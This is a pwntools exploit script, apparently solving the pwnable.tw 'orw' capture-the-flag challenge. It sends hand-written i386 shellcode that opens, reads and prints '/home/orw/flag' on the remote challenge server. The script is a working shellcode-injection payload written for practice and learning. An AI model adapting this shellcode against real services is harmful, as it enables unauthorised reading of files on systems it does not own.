from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./orw')
else:
	p = remote('chall.pwnable.tw',10001)
#gdb.attach(p)
open_shellcode = "xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;"
read_shellcode = "mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80;"
write_shellcode = "mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x80;"
shellcode = open_shellcode + read_shellcode + write_shellcode
payload = asm(shellcode)
p.recvuntil(':')
p.send(payload)
p.interactive()
